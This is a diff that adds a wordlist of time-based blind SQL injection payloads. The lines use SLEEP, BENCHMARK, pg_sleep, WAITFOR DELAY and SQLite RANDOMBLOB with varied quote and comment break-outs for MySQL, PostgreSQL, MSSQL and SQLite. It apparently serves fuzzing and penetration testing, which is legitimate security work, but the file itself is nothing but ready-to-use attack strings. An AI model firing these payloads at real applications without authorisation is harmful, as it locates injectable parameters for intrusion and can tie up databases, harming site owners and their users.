@@ -1,0 +1,63 @@
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+sleep(5)#
+(sleep 5)--
+(sleep 5)
+(sleep(5))--
+(sleep(5))
+-sleep(5)
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+";sleep 5--
+";sleep 5
+";sleep(5)--
+";sleep(5)
+";SELECT SLEEP(5); #
+1 SELECT SLEEP(5); #
++ SLEEP(5) + '
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+;sleep 5--
+;sleep 5
+;sleep(5)--
+;sleep(5)
+;SELECT SLEEP(5); #
+'&&SLEEP(5)&&'1
+' SELECT SLEEP(5); #
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+and SELECT pg_sleep(5);
+1 SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+;waitfor delay '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
